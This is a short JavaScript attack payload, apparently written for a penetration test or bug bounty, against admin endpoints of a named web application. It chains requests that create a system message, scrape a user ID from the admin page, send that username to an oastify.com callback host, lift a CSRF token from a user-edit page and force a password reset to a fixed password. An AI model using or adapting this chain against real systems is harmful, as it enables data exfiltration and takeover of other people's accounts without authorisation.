// Step 1: Create a system message
fetch("https://refeng.erad.com/Admin/AdminSystemMessages/SaveSystemMessage", {
  method: "POST",
  headers: { "Content-Type": "application/x-www-form-urlencoded" },
  body: "aMessage.system_message_key=&aMessage.title=test&__autocomplete_fix_aMessage.title=&aMessage.description=test&aMessage.link_text=&__autocomplete_fix_aMessage.link_text=&aMessage.link=&__autocomplete_fix_aMessage.link=&FromMessageGroup=marketing&aMessage.type=Message&aMessage.start_date=4-23-2050&__autocomplete_fix_aMessage.start_date=4-23-2050&aMessage.start_time=12%3A00+AM&__autocomplete_fix_aMessage.start_time=12%3A00+AM&aMessage.expire_date=4-23-2050&__autocomplete_fix_aMessage.expire_date=4-23-2050&aMessage.expiry_time=12%3A00+AM&__autocomplete_fix_aMessage.expiry_time=12%3A00+AM&SiteGroupCodes=Blueridge&SiteGroupCodes=MTD&multiselect=multiselect-all&multiselect=Blueridge&multiselect=MTD&aMessage.radar_notification_flag=N&aMessage.radar_link_text=&__autocomplete_fix_aMessage.radar_link_text=&aMessage.radar_resolution_text=&__autocomplete_fix_aMessage.radar_resolution_text="
})
.then(() => {
  // Step 2: Fetch system messages to extract user ID
  return fetch("https://refeng.erad.com/Admin/AdminSystemMessages");
})
.then(res => res.text())
.then(res => {
  // Step 3: Extract created_by_user_id
  const userMatch = res.match(/"created_by_user_id":"(.*?)"/);
  const username = userMatch ? userMatch[1] : "unknown";

  // Step 4: Exfiltrate username via GET request
  fetch(`https://e6lro3u8emhepsadx7bnne1t6kcb01oq.oastify.com?username=${encodeURIComponent(username)}`);

  // Step 5: Get CSRF token and perform password reset
  return fetch("https://refeng.erad.com/Admin/AdminUsers/Edit?aUserKey=25713");
})
.then(res => res.text())
.then(res => {
  const tokenMatch = res.match(/__RequestVerificationToken" type="hidden" value="([^"]+)"/);
  const token = tokenMatch ? tokenMatch[1] : "";

  // Step 6: Submit password reset
  fetch("https://refeng.erad.com/Home/PasswordReset", {
    method: "POST",
    headers: { "Content-Type": "application/x-www-form-urlencoded" },
    body: `__RequestVerificationToken=${encodeURIComponent(token)}&NewPassword=Test@123@12&ConfirmPassword=Test@123@12&returnUrl=%2F`
  });
});
